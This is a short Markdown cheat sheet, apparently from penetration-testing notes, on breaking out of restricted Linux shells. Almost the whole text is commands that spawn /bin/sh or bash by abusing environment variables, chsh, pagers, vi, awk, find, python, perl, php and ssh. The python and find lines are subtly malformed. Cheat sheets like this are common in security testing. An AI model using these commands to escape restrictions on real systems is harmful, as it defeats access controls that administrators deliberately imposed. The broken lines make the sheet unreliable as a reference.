### Check for writeable environment variables - if the PATH is writeable, set it to /bin/sh or similar
```
env
export -p
```

### If / is allowed in commands
```
export PATH=/bin:/usr/bin:/sbin:$PATH
export SHELL=/bin/sh
```

### Change the shell
```
chsh
```

### Copy into existing PATH
```
cp /bin/sh <path/to/directory>; sh
```

### More, less, man, ftp,gdb
```
!/bin/sh
```

### Vi, vim
```
:!/bin/sh
```

### Awk
```
awk 'BEGIN {system("/bin/sh")}'
```

### Find
```
find / -name <string> -exec /bin/sh ;
```

### Tee
```
echo "<command>" | tee <file>.sh
```

### Python
```
python -c 'import os; os.system("/bin/bash")
```

### Perl
```
perl -e 'exec "/bin/sh";'
```

### Php
```
php -r "pcntl_exec('/bin/sh', ['-p']);"
```

### Ssh
```
ssh <user>@<rhost> -t "/bin/sh"
ssh <user>@<rhost> -t "bash --noprofile"
```

